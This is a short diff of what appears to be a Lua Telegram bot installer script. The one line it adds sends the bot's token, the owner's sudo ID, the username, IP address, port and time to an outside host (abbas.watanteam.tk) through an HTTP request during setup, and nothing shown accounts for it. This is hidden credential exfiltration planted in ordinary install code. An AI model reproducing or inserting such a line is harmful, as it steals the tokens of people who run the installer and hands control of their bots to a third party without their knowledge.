@@ -77,6 +77,7 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('http://abbas.watanteam.tk/WaTaN/index.php?n=WaTaN&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("WaTaN", "w")  
 file:write([[
